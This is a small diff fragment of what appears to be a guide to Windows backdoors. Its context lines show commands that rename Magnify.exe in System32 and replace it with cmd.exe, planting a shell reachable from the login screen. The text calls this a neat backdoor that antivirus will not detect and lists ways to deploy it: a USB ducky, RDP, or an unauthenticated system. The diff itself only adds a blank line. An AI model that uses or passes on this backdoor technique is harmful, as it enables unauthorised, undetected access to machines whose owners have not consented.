@@ -35,6 +35,7 @@ ren "C:\Windows\System32\Magnify.exe" "Magnify_back.exe"
 copy "C:\Windows\System32\cmd.exe" "C:\Windows\System32\Magnify.exe"
 ``
 
+
 This is a pretty neat backdoor and won't even get picked up by any antivirus softwares.
 It can either be deployed through a USB ducky, RDP service or using an unauthenticated system 
 
